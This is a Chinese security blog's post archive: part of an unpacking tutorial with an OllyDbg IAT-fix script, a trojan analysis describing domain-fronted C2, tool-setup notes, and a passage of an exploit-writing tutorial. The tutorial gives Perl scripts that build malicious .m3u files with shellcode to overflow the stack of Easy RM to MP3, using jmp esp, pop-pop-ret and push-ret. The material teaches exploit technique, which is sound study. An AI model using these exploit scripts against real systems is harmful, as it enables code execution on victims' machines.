title="img"></p><p>然后进run跟踪的界面,找到7*******开头往这个eax里面写入的地址就是GetAPIAddr了</p><p>可以看到这里获取到了API的地址<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/275a6cef-4ad9-46a0-a894-a661aae2bc0a.png" class="" title="img"></p><p>这个地方就可以用了,也可以再往上找一下eax是从哪来的</p><p>找到是从这个地方获取的<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/40552cb0-1999-4878-b33f-1707b93ec133.png" class="" title="img"><br> <strong>1D1914或者1D0474</strong><br> <strong>我们写脱壳脚本的时候GetAPI用这两个地址都可以</strong></p><pre><code>// 定义变量,初始化变量 VAR dwGetAPIAddr VAR dwWriteIATAddr VAR dwOEP VAR dwTmp MOV dwGetAPIAddr, 001D0474     // 获取 API 地址的地方      MOV dwWriteIATAddr, 001D0897   // 填充 IAT 的地方 MOV dwOEP, 0047148B            // OEP// 清理环境 BC     // 清理软件断点 BPHWC  // 清理硬件断点 BPMC   // 清理内存断点 // 设置断点 BPHWS dwOEP, "x" BPHWS dwGetAPIAddr, "x" BPHWS dwWriteIATAddr, "x"// 构造循环 LOOP1:  // 运行程序 RUN // 判断 是 获取 API 地址的地方 cmp eip,dwGetAPIAddr JNZ SIGN1 MOV dwTmp, eax jmp LOOP1   // 判断 是 填充 IAT 的地方 SIGN1: cmp eip,dwWriteIATAddr JNZ SIGN2  MOV [edx],dwTmp jmp LOOP1  // 判断是 OEP ，结束了 SIGN2: cmp eip,dwOEP JZ EXIT1 jmp LOOP1  // 脚本结束 EXIT1: MSG "yes，今晚吃鸡！"</code></pre><p>等脚本跑完 修复完导入表</p><h3 id="在OEP处右键使用OllyDump将程序dump出来"><a href="#在OEP处右键使用OllyDump将程序dump出来" class="headerlink" title="在OEP处右键使用OllyDump将程序dump出来"></a>在OEP处右键使用OllyDump将程序dump出来</h3><img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/37b4e9f6-c4c2-4952-960c-f569a9303764.png" class="" title="img"><h3 id="然后用imporREC修复一下dump出来程序的导入表就可以了"><a href="#然后用imporREC修复一下dump出来程序的导入表就可以了" class="headerlink" title="然后用imporREC修复一下dump出来程序的导入表就可以了"></a>然后用imporREC修复一下dump出来程序的导入表就可以了</h3><img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/image-20210524164615794.png" class="" title="image-20210524164615794"><h3 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h3><img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/image-20210524153137607.png" class="" title="image-20210524153137607">]]></content>
      
      
      <categories>
          
          <category> Windows逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HW样本分析</title>
      <link href="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
      <url>/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-样本信息"><a href="#0x00-样本信息" class="headerlink" title="0x00 样本信息"></a>0x00 样本信息</h3><p>​HW期间拿到的一个样本，用了lnk的启动方式。运行后会启动隐藏属性的exe和dll文件，进行后续的内存解密操作后用域前置的方法执行外联操作。</p><span id="more"></span><h3 id="0x01-行为分析"><a href="#0x01-行为分析" class="headerlink" title="0x01 行为分析"></a>0x01 行为分析</h3><ol><li><p>行为分析</p><p>样本解压后可以看到两个文件：一个excle表，一个pdf快捷方式。excle表查看后是一个正常的文件。</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523160235108.png" class="" title="image-20210523160235108"><p>通过火绒剑行为监控可以看到快捷方式执行后会有一些启动bat脚本和外连等行为</p><p>根据bat文件可以看到lnk文件执行之后，运行的主体为sihost.exe &amp; MpSvc.dll，接下来跟据前面监测到的的一些行为对这两个文件进行详细分析。</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210524114643659.png" class="" title="image-20210524114643659"><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523161133203.png" class="" title="image-20210523161133203"><h3 id="0x02-调试分析"><a href="#0x02-调试分析" class="headerlink" title="0x02 调试分析"></a>0x02 调试分析</h3><p>用ida查看sihost.exe的函数调用视图可以看到调用过程非常简单，启动函数调用了三个函数sub-401104获取了一些信息并未做什么后续的操作，所以主要从DLL的ServiceCrtMain函数开始分析</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523162746448.png" class="" title="image-20210523162746448"><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523163951134.png" class="" title="image-20210523163951134"><p>顺便看一下dll用到了非常多的导入函数</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523161510791.png" class="" title="image-20210523161510791"><p>进入mpsvc.dll后可以看到首先创建了一个互斥体来防止多开，继续往下调试</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523221615770.png" class="" title="image-20210523221615770"><p>可以看到此处VirtualAlloc在0x130000处开辟了一块可读可写可执行的空间，之后又往这片内存写入了一个PE文件</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523221905856.png" class="" title="image-20210523221905856"><p>前面用火绒剑抓取到了有外链的操作，在进入这个地方已经加载网络通信相关dll后，可以直接下HttpSendRequestA等网络链接相关断点</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523232014720.png" class="" title="image-20210523232014720"><p>继续往下执行，可以看到又使用virtualalloc开辟了一块空间</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523232805093.png" class="" title="image-20210523232805093"><p>此时可以选择F9直接执行会断在HttpSendRequestA处，就可以看到链接的域名C2</p><img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523234035732.png" class="" title="image-20210523234035732"></li></ol><p>可以看到链接的C2是一个高信誉的域名，这个地方是采用了域前置的方式，去访问用同一个CDN加速的另一个域名。</p>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>winXP安装mona</title>
      <link href="/2021/05/20/winDbg%E5%AE%89%E8%A3%85mona/"/>
      <url>/2021/05/20/winDbg%E5%AE%89%E8%A3%85mona/</url>
      
        <content type="html"><![CDATA[<h3 id="Windows-XP，32位"><a href="#Windows-XP，32位" class="headerlink" title="Windows XP，32位"></a>Windows XP，32位</h3><ol><li><p>从<a href="https://github.com/corelan/windbglib/raw/master/pykd/pykd.zip%E4%B8%8B%E8%BD%BDpykd.zip">https://github.com/corelan/windbglib/raw/master/pykd/pykd.zip下载pykd.zip</a></p></li><li><p>解压后获得2个文件：pykd.pyd和vcredist_x86.exe</p></li><li><p>使用管理员权限运行vcredist_x86.exe并接受默认值。</p></li><li><p>将pykd.pyd复制到 <code>C:\Program Files\Debugging Tools for Windows (x86)\winext</code></p></li><li><p>打开具有管理员权限的命令提示符，然后运行以下命令：</p><pre><code>c:cd "C:\Program Files\Common Files\Microsoft Shared\VC"regsvr32 msdia90.dll(You should get a messagebox indicating that the dll was registered successfully)</code></pre></li><li><p>从<a href="https://github.com/corelan/windbglib/raw/master/windbglib.py%E4%B8%8B%E8%BD%BDwindbglib.py">https://github.com/corelan/windbglib/raw/master/windbglib.py下载windbglib.py</a></p></li><li><p>将文件保存在下面<code>C:\Program Files\Debugging Tools for Windows (x86)</code> （如果需要，“取消阻止”文件）</p></li><li><p>从<a href="https://github.com/corelan/mona/raw/master/mona.py%E4%B8%8B%E8%BD%BDmona.py">https://github.com/corelan/mona/raw/master/mona.py下载mona.py</a></p></li><li><p>将文件保存在下面<code>C:\Program Files\Debugging Tools for Windows (x86)</code> （如果需要，“取消阻止”文件）</p></li></ol><span id="more"></span><h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><p>打开Windbg并执行以下命令： <code>.load pykd.pyd</code></p><p>mona命令可以通过运行来访问 <code>!py mona</code></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> winDbg插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go环境变量设置</title>
      <link href="/2021/05/20/go%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/"/>
      <url>/2021/05/20/go%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="question："><a href="#question：" class="headerlink" title="question："></a>question：</h3><ul><li>linux下设置go环境变量之后，再次打开新的终端或者重启后环境变量会失效需要重新<code>source /etc/profile</code> 后才能生效</li></ul><span id="more"></span><h3 id="answer："><a href="#answer：" class="headerlink" title="answer："></a>answer：</h3><ul><li>原来在 <code>/etc/profile</code> 中写入的环境变量输出的是普通用户的环境变量，设置root用户的环境变量需要在<code>/root/.bashrc</code> 里面写入环境变量（将刚才在 <code>/etc/profile</code> 中写入的环境变量拷贝过来重新 <code>source /root/.bashrc</code> 即可）</li><li>然后无论是重启还是打开新的终端无论是普通用户还是root用户输入 <code>go env</code> 就可以看到我们设置好的环境变量生效。</li></ul><img src="/2021/05/20/go%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/image-20200418165608857.png" class="" title="image-20200418165608857">]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exploit编写系列2：栈溢出，跳转至shellcode</title>
      <link href="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/"/>
      <url>/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="exploit编写系列2：栈溢出，跳转至shellcode"><a href="#exploit编写系列2：栈溢出，跳转至shellcode" class="headerlink" title="exploit编写系列2：栈溢出，跳转至shellcode"></a>exploit编写系列2：栈溢出，跳转至shellcode</h1><p>这篇blog是为了学习如何用各种方式去构造栈溢出类型漏洞的exp</p><p>执行shellcode的多种方法：</p><ol><li>jump/call寄存器</li><li>pop return</li><li>push return</li><li>jmp[reg + offset]</li><li>blind return</li><li>jmp code</li><li>SHE</li><li>call</li></ol><span id="more"></span><hr><h3 id="1-jmp-x2F-call-寄存器"><a href="#1-jmp-x2F-call-寄存器" class="headerlink" title="1. jmp/call 寄存器"></a>1. jmp/call 寄存器</h3><p>在第一篇中已经详细分析过</p><h3 id="2-pop-pop-ret"><a href="#2-pop-pop-ret" class="headerlink" title="2. pop pop ret"></a>2. pop pop ret</h3><p>这个exp我们依然还使用上一篇分析的Easy RM to MP3的漏洞来编写，在上一章使用jmp register 编写exp的时候，我们已经能够调整缓冲区，使ESP直接指向我们的shellcode。但是如果shellcode入口发生偏移比如：shellcode的入口位于ESP+8的时候，我们又该怎么去编写exp呢？理论上，当ESP+offset已经包含shellcode地址，那么只有pop ret这种方法使可行的….如果不是如此（事情往往并非如此），那么也许还有其他方法。</p><p>接下来我们尝试采用pop pop ret的方式来重新调整一下shellcode，在上一章的调试中我们已经知道了覆盖EIP需要26067byte，另外在ESP指向的栈地址（0x000ffd38）前还需要4byte。为了模拟出shellcode起始于ESP+8的假象，我们需要构造出一块栈情况如下的缓冲区：</p><p>26067xA，XXXX，INT3中断，7NOP，INT3中断，后面放一些NOP。</p><p>这样排列我们就可以将真正的shellcode放置于ESP+8后。</p><p>先按上面的思路编写一下我们的shellcode</p><pre><code class="perl">my $file= "test1.m3u";my $junk= "A" x 26067;my $eip = "BBBB"; #overwrite EIPmy $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytesmy $shellcode = "\xcc"; #first break$shellcode = $shellcode . "\x90" x 7; #add 7 more bytes$shellcode = $shellcode . "\xcc"; #second break$shellcode = $shellcode . "\x90" x 500; #real shellcodeopen($FILE,"&gt;$file");print $FILE $junk.$eip.$prependesp.$shellcode;close($FILE);print "m3u File Created successfully\n";</code></pre><p>用Easy RM to MP3打开生成的test1.m3u，中断之后查看一下堆栈，现在中断于EIP我们填写的”BBBB”处，输入<code>d esp</code>查看一下栈的排列，esp指向0x000ffd38处，里面的内容跟我们刚来编写的代码一致：0xCC + 7个0x90 + 0xCC + 500个0x90（shellcode）</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20201229004417938-1621477705987.png" class="" title="image-20201229004417938"><p>为了让EIP直接跳往EIP+8（我们的payload处），我们需要使用pop ret技术+jmp esp地址来完成此项任务。</p><p>一个pop指令可以将栈顶弹出四个byte，我们需要两个pop指令就可以将ESP+8（0x000ffd38+8 = 0x000ffd40）,此时再执行ret指令就会将当前ESP的值（0x000ffd40）赋予EIP。如果在此时的ESP（0x000ffd40)处包含有jmp esp指令的地址，那么此时EIP就将会执行jmp esp指令跳转到此时的ESP（0x000ffd40)处，这样的话我们就必须把我们的shellcode放置在0x000ffd40后面的缓冲区中。</p><p>接下来我们需要先找到一个可用的pop pop ret指令的地址，用这串指令的首地址来覆盖EIP，然后在ESP+8处放入jmp esp指令的地址，再后面紧跟着的就是shellcode了。</p><p>重新打开Easy RM to MP3然后使用windbg附加进程，使用windbg的汇编功能来搜索一下 pop pop ret指令的位置</p><pre><code>ntdll!DbgBreakPoint:7c92120e cc              int     30:010&gt; a7c92120e pop eaxpop eax7c92120f pop ebppop ebp7c921210 retret7c921211 0:010&gt; u 7c92120e ntdll!DbgBreakPoint:7c92120e 58              pop     eax7c92120f 5d              pop     ebp7c921210 c3              ret7c921211 ffcc            dec     esp7c921213 c3              ret7c921214 8bff            mov     edi,edi7c921216 8b442404        mov     eax,dword ptr [esp+4]7c92121a cc              int     3</code></pre><p>我们可以查到pop eax, pop ebx, ret三条指令对应的机器码为：0x58 0x5d 0xc3</p><p>然后我们可以在加载的DLL里面查找包含这三条指令的地址</p><p>重新打开windbg并加载Easy RM to MP3</p><p>在加载的DLL里面搜索我们需要的指令，这里关于DLL的选择如果每次DLL加载的基址都相同的话我们就选择应用程序的DLL如果每次加载的基址都会改变的话，就选择系统的DLL会更好点</p><p>需要注意的是我们选择的地址尽量不要包含有”00”</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20201231000901339-1621477705987.png" class="" title="image-20201231000901339"><p>现在我们可以使用上面搜索到的地址让我们跳转到ESP+8，现在我们需要在ESP+8处填入jmp esp的地址（前面解释过，ret指令将从这里获取地址，并将其赋值给EIP执行）。</p><p>用同样的方法来搜索一下 jmp esp的地址</p><pre><code>0:010&gt; s 01940000 l 019b1000   ff e401b7f23a  ff e4 ff 8d 4e 10 c7 44-24 10 ff ff ff ff e8 f3  ....N..D$.......01bb023f  ff e4 fb 4d 1b a6 9c ff-ff 54 a2 ea 1a d9 9c ff  ...M.....T......01bcd3db  ff e4 ca b9 01 20 05 93-19 09 00 00 00 00 d4 bc  ..... ..........01beb22a  ff e4 07 07 f2 01 57 f2-5d 1c d3 e8 09 22 d5 d0  ......W.]...."..01beb72d  ff e4 09 7d e4 ad 37 df-e7 cf 25 23 c9 a0 4a 26  ...}..7...%#..J&amp;</code></pre><p>此时我们可以将EIP执行到ESP指向的位置了，接下来我们需要用真正的shellcode替换掉原来的500个NOP。</p><p>替换后的缓冲区情况如下：</p><table><thead><tr><th>AAAAAAAAAAAAAAAAAA…</th><th>0x01966a10</th><th>NOP NPO</th><th>0x01b7f23a</th><th>SHELLCODE</th></tr></thead><tbody><tr><td>26067</td><td>EIP</td><td>8 BYTE OFFSET</td><td>JMP ESP</td><td></td></tr><tr><td></td><td>POP POP RET</td><td></td><td></td><td></td></tr></tbody></table><p>现在我们构造的exp执行情况如下：</p><ol><li>EIP被pop pop ret 指令的地址覆盖，ESP会指向shellcode偏移8字节的地址；</li><li>pop pop ret被执行之后，EIP会被ESP+8处的（jmp esp）0x01b7f23a指令覆盖，ESP指向shellcode；</li><li>由于EIP被jmp esp指令的地址覆盖，因此程序会跳转到shellcode执行。</li></ol><pre><code class="perl">my $file= "test3.m3u";my $junk= "A" x 26067;my $eip = pack('V',0x01966a10); #overwrite EIPmy $jmpesp = pack('V',0x01b7f23a);my $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytes#my $shellcode = "\xcc"; #first break$shellcode = "\x90" x 8; #add 7 more bytes$shellcode = $shellcode . $jmpesp; #second break$shellcode = $shellcode . "\x90" x 50; #real shellcode$shellcode = $shellcode . "\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" ."\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" ."\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" ."\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" ."\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" ."\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" ."\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" ."\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" ."\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" ."\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" ."\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" ."\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" ."\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" ."\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" ."\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" ."\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" ."\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" ."\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" ."\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" ."\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" ."\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" ."\x31\x42\x4c\x42\x43\x45\x50\x41\x41";open($FILE,"&gt;$file");print $FILE $junk.$eip.$prependesp.$shellcode;close($FILE);print "m3u File Created successfully\n";</code></pre><p>成功的执行了shellcode弹出了计算器</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20201231004613153-1621477705987.png" class="" title="image-20201231004613153"><h3 id="3-push-return"><a href="#3-push-return" class="headerlink" title="3. push return"></a>3. push return</h3><p>push ret与call [reg]有些相似，如果有个寄存器指向你的shellcode，但是由于某些原因你无法使用jmp[reg]去跳转到shellcode，可以采用：</p><ul><li>将寄存器地址压入栈中，它将位于栈顶</li><li>ret（从栈中获取返回地址，并跳转到该地址）</li></ul><p>为了实现这种方法，你需要用某个dll中的push [reg] + ret 指令串地址去覆盖EIP。为了直接将使用的shellcode放入ESP中，你首先需要搜索‘push esp’和‘ret’的机器码。</p><h4 id="0x00-重新运行Easy-RM-to-MP3并用windbg附加"><a href="#0x00-重新运行Easy-RM-to-MP3并用windbg附加" class="headerlink" title="0x00 重新运行Easy RM to MP3并用windbg附加"></a>0x00 重新运行Easy RM to MP3并用windbg附加</h4><p>用windbg的汇编搜索功能来寻找一段<code>push esp</code>&amp;<code>ret</code>指令</p><pre><code>0:010&gt; a7c92120f push esppush esp7c921210 retret7c921211 0:010&gt; u 7c92120f ntdll!DbgBreakPoint+0x1:7c92120f 54              push    esp7c921210 c3              ret7c921211 ffcc            dec     esp7c921213 c3              ret7c921214 8bff            mov     edi,edi7c921216 8b442404        mov     eax,dword ptr [esp+4]7c92121a cc              int     37c92121b c20400          ret     4</code></pre><p>可以看到指令对应的机器码为<code>54 c3</code>，然后我们可以从加载的dll里面搜索一条可用的指令地址</p><pre><code>0:010&gt; s 01940000 l 019b1000   54 c3019557f6  54 c3 90 90 90 90 90 90-90 90 8b 44 24 08 85 c0  T..........D$...01a01d88  54 c3 fe ff 85 c0 74 5d-53 8b 5c 24 30 57 8d 4c  T.....t]S.\$0W.L01a2cd65  54 c3 8b 87 33 05 00 00-83 f8 06 0f 85 92 01 00  T...3...........01a2cf2f  54 c3 8b 4c 24 58 8b c6-5f 5e 5d 5b 64 89 0d 00  T..L$X.._^][d...01a2cf44  54 c3 90 90 90 90 90 90-90 90 90 90 8a 81 da 04  T...............</code></pre><p>选择一个地址，构造exp并运行(直接用call [reg]的exp，将eip修改为我们刚找到的指令地址即可)</p><pre><code class="perl">my $file= "test_5.m3u";my $junk= "A" x 26067;my $eip = pack('V',0x019557f6); #overwrite EIP with call espmy $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytesmy $shellcode = "\x90" x 25; #start shellcode with some NOPS$shellcode = $shellcode ."\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" ."\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" ."\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" ."\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" ."\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" ."\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" ."\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" ."\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" ."\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" ."\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" ."\x7f\xe8\x7b\xca";open($FILE,"&gt;$file");print $FILE $junk.$eip.$prependesp.$shellcode;close($FILE);print "m3u File Created successfully\n";</code></pre><p>利用成功</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210102172628709-1621477705987.png" class="" title="image-20210102172628709"><h3 id="4-jmp-reg-offset"><a href="#4-jmp-reg-offset" class="headerlink" title="4. jmp [reg + offset]"></a>4. jmp [reg + offset]</h3><p>如果我们的shellcode再寄存器入口处偏移几个字节的位置，也可以用windbg搜索jmp [reg + offset]指令来跳转过去。</p><pre><code>0:010&gt; a7c92120e jmp [esp+8]jmp [esp+8]7c921212 u 7c92120e u 7c92120e         ^ Bad opcode error in 'u 7c92120e '7c921212 0:010&gt; u 7c92120e ntdll!DbgBreakPoint:7c92120e ff642408        jmp     dword ptr [esp+8]ntdll!DbgUserBreakPoint:7c921212 cc              int     37c921213 c3              ret7c921214 8bff            mov     edi,edi7c921216 8b442404        mov     eax,dword ptr [esp+4]7c92121a cc              int     37c92121b c20400          ret     4</code></pre><p>看结果我们可以知道jmp [esp+8]对应的机器码为<code>ff642408</code>，我们可以尝试再其它的dll中搜索包含这条指令的地址，不过我搜索了几个dll没有搜索到这条指令</p><h3 id="5-Blind-return"><a href="#5-Blind-return" class="headerlink" title="5. Blind return"></a>5. Blind return</h3><p>此利用主要用于在ESP寄存器指向地址可用字节数不多的情况下，设置跳板跳往可以足够容纳我们shellcode地址的地方去执行的方法。</p><p>此项技术基于以下步骤：</p><ul><li>利用ret指令地址覆写EIP</li><li>在ESP首4字节中对shellcode地址进行硬编码</li><li>当ret执行时，新添加的4字节（最顶端的值）将从栈中弹出，并赋予EIP</li><li>exploit跳至shellcode执行</li></ul><p>因此这种方法在以下情况是可用的：</p><ul><li>无法将EIP直接指向某寄存器（因为无法使用jmp或call指令，这意味着你需要对shellcode起始地址进行硬编码）</li><li>可控制ESP中的数据（至少能控制前四字节）</li></ul><p>如果我们想要实现上面的利用方法：</p><p>需要拥有shellcode的内存地址（即ESP地址）。</p><ol start="2"><li>在DLL中查找到‘ret’指令的地址</li></ol><p>先生成一个测试文件来模拟一下堆栈空间</p><p>26067个字节A覆盖eip之前的位置+四个字节B覆盖eip + 50个字节的X来作为我们放置跳转指令的地址 + 一段不可用的null</p><pre><code class="perl">my $file= "blind_return_1.m3u";my $junk= "A" x 26067;my $eip = "BBBB";my $preshellcode = "X" x 54; #let's pretend this is the only space we have availablemy $nop = "\x90" x 230; #added some nops to visually separate our 54 X's from other dataopen($FILE,"&gt;$file");print $FILE $junk.$eip.$preshellcode.$nop;close($FILE);</code></pre><p>A’s地址距离ESP的偏移</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210112215736411-1621477705987.png" class="" title="image-20210112215736411"><p>继续往后查看内存，可以看到在ESP+281之后有大段的我们写入的A字符，这表明我们可以使用这段地址来放置我们的shellcode，在X’s位置设置跳转来跳往A’s地址处</p><pre><code>eax=00000001 ebx=00104a58 ecx=7c93003d edx=00000004 esi=77c2fce0 edi=000066f3eip=42424242 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=0000021642424242 ??              ???0:000&gt; d esp000ffd38  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX000ffd48  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX000ffd58  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX000ffd68  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............000ffd78  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffd88  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffd98  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffda8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................0:000&gt; d000ffdb8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffdc8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffdd8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffde8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffdf8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe08  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe18  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe28  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................0:000&gt; d000ffe38  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe48  90 90 90 90 90 90 90 90-00 41 41 41 41 41 41 41  .........AAAAAAA000ffe58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffe68  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffe78  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffe88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  